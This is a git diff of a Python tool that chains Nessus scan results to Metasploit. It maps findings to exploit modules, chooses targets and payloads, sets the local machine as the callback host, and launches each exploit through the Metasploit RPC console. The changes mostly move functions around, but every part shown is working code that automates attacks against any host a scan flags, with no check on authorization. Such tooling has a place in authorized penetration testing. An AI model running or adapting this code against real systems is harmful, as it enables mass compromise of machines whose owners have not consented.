@@ -141,6 +141,30 @@ def get_console_id(client):
 
 ########################### NEW CODE BELOW ############################
 
+
+def run_nessus_exploits(client, c_id, nes_exploits):
+    '''
+    Matches metasploit module description from Nessus output to the
+    actual module path. Doesn't do aux (so no DOS), just exploits
+    '''
+    local_ip = get_local_ip(get_iface())
+    msf_exploits = get_all_exploits(client, c_id)
+
+    for mod_data in nes_exploits:
+        mod_desc = mod_data[0]
+        ip = mod_data[1]
+        port = mod_data[2]
+        os_type = mod_data[3]
+        path = get_msf_path(msf_exploits, mod_desc, os_type)
+        if not path:
+            continue
+
+        module_output = run_msf_module(client, c_id, local_ip, ip, path, port, os_type)
+        print('[*] {} output:'.format(path))
+        for l in module_output:
+            print('    '+l)
+        print('')
+
 def get_iface():
     '''
     Grabs an interface so we can grab the IP off that interface
@@ -174,46 +198,6 @@ def get_local_ip(iface):
     return ip
 
 
-def run_nessus_exploits(client, c_id, nes_exploits):
-    '''
-    Matches metasploit module description from Nessus output to the
-    actual module path. Doesn't do aux (so no DOS), just exploits
-    '''
-    local_ip = get_local_ip(get_iface())
-    msf_exploits = get_all_exploits(client, c_id)
-
-    for mod_data in nes_exploits:
-        mod_desc = mod_data[0]
-        ip = mod_data[1]
-        port = mod_data[2]
-        os_type = mod_data[3]
-        path = get_msf_path(msf_exploits, mod_desc, os_type)
-        if not path:
-            continue
-
-        module_output = run_msf_module(client, c_id, local_ip, ip, path, port, os_type)
-        print('[*] {} output:'.format(path))
-        for l in module_output:
-            print('    '+l)
-        print('')
-
-
-def get_msf_path(msf_exploits, mod_desc, os_type):
-    '''
-    Converts Nessus' module desc to MSF module path
-    '''
-    for x in msf_exploits:
-        x_split = x.split(None, 3)
-        if len(x_split) == 4:
-            path = x_split[0]
-            date = x_split[1]
-            rank = x_split[2]
-            msf_desc = x_split[3]
-            if mod_desc.lower() in msf_desc.lower():
-                if 'exploit/'+os_type in path or 'exploit/multi' in path:
-                    return path
-
-
 def get_all_exploits(client, c_id):
     '''
     Gets all exploit modules from MSF
@@ -231,19 +215,40 @@ def get_all_exploits(client, c_id):
     return all_exploits
 
 
-def get_module_path(all_mods, mod_data):
+def run_console_cmd(client, c_id, cmd):
     '''
-    Convert module description from nessus to module path in msf
+    Runs module and gets output
     '''
-    path = None
-    for mod_path in all_mods[b'modules']:
-        if mod[b'name'].decode('utf8') == mod_desc:
-            path = mod[b'fullname'].decode('utf8')
+    cmd = cmd + '\n'
 
-            # Prevent auxiliary and post modules, all DOS modules are auxiliary
-            if path.startswith('exploit/'):
-                print('[*] Using module {}'.format(path))
-                return path
+    print('[*] Running MSF command:')
+    for l in cmd.splitlines():
+        l = l.strip()
+        if l != '':
+            print('    {}'.format(l))
+    print('')
+
+    client.call('console.write',[c_id, cmd])
+    time.sleep(3)
+    mod_output = get_console_output(client, c_id)
+
+    return mod_output
+
+
+def get_msf_path(msf_exploits, mod_desc, os_type):
+    '''
+    Converts Nessus' module desc to MSF module path
+    '''
+    for x in msf_exploits:
+        x_split = x.split(None, 3)
+        if len(x_split) == 4:
+            path = x_split[0]
+            date = x_split[1]
+            rank = x_split[2]
+            msf_desc = x_split[3]
+            if mod_desc.lower() in msf_desc.lower():
+                if 'exploit/'+os_type in path or 'exploit/multi' in path:
+                    return path
 
 
 def run_msf_module(client, c_id, local_ip, ip, mod_path, port, os_type):
@@ -271,6 +276,7 @@ def run_msf_module(client, c_id, local_ip, ip, mod_path, port, os_type):
     mod_out = run_console_cmd(client, c_id, exploit_cmd)
 
     return mod_out
+
 
 def get_req_opts(client, c_id, mod_path):
     '''
@@ -327,28 +333,6 @@ def get_target(client, c_id, mod_path, os_type):
     return target_num
 
 
-def create_msf_cmd(mod_path, rhost_var, ip, port, payload, target_num, extra_opts=''):
-    '''
-    Creates a one-liner MSF command to set all the right options
-    You can set arbitrary options that don't get used which is why we autoinclude
-    ExitOnSession True and SRVHOST (for JBoss)
-    '''
-    local_ip = get_local_ip(get_iface())
-    print('[*] Setting options on {}'.format(mod_path))
-    cmd = """
-           set target {}\n
-           set {} {}\n
-           set RPORT {}\n
-           set LHOST {}\n
-           set SRVHOST {}\n
-           set payload {}\n
-           set ExitOnSession True\n
-           {}\n
-           """.format(target_num, rhost_var, ip, port, local_ip, local_ip, payload, extra_opts)
-
-    return cmd
-
-
 def get_target_num_lines(client, c_id, mod_path):
     '''
     Gets just the lines of output that contain a target number
@@ -370,6 +354,28 @@ def get_target_num_lines(client, c_id, mod_path):
             targets[target_num] = l[1].lower()
 
     return targets
+
+
+def create_msf_cmd(mod_path, rhost_var, ip, port, payload, target_num, extra_opts=''):
+    '''
+    Creates a one-liner MSF command to set all the right options
+    You can set arbitrary options that don't get used which is why we autoinclude
+    ExitOnSession True and SRVHOST (for JBoss)
+    '''
+    local_ip = get_local_ip(get_iface())
+    print('[*] Setting options on {}'.format(mod_path))
+    cmd = """
+           set target {}\n
+           set {} {}\n
+           set RPORT {}\n
+           set LHOST {}\n
+           set SRVHOST {}\n
+           set payload {}\n
+           set ExitOnSession True\n
+           {}\n
+           """.format(target_num, rhost_var, ip, port, local_ip, local_ip, payload, extra_opts)
+
+    return cmd
 
 
 def get_payload(client, mod_path, os_type, target_num):
@@ -419,26 +425,6 @@ def get_payload(client, mod_path, os_type, target_num):
             print('[-] Skipping this exploit')
 
     return payload
-
-
-def run_console_cmd(client, c_id, cmd):
-    '''
-    Runs module and gets output
-    '''
-    cmd = cmd + '\n'
-
-    print('[*] Running MSF command:')
-    for l in cmd.splitlines():
-        l = l.strip()
-        if l != '':
-            print('    {}'.format(l))
-    print('')
-
-    client.call('console.write',[c_id, cmd])
-    time.sleep(3)
-    mod_output = get_console_output(client, c_id)
-
-    return mod_output
 
 
 def get_console_output(client, c_id):
